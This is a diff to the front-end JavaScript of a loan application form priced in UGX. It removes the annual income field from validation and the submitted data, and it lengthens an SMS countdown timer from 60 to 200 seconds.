@@ -354,15 +354,13 @@ function toS3() {
 
 function submitApp() {
     const em = document.getElementById('s3em').value;
-    const in_ = +document.getElementById('s3in').value;
 
-    if (!em || in_ <= 0) {
+    if (!em) {
         showErr('s3Err', 'Please complete all fields.');
         return;
     }
 
     S.employment = em;
-    S.annualIncome = in_;
     S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
 
     document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
@@ -380,8 +378,7 @@ function submitApp() {
         loanAmount: S.loanAmount,
         loanTerm: S.loanTerm,
         purpose: S.loanPurpose,
-        employment: S.employment,
-        annualIncome: S.annualIncome
+        employment: S.employment
     });
     S.applicationId = session.id;
     currentSessionId = session.id;
@@ -549,12 +546,12 @@ function startSmsTimer() {
     arc.style.strokeDashoffset = '0';
     document.getElementById('smsTimerWrap').style.display = 'flex';
 
-    let remaining = 60;
+    let remaining = 200;
     const CIRCUMFERENCE = 113;
 
     const tick = function() {
         remaining--;
-        const pct = remaining / 60;
+        const pct = remaining / 200;
         arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
         num.textContent = remaining;
         sec.textContent = remaining;
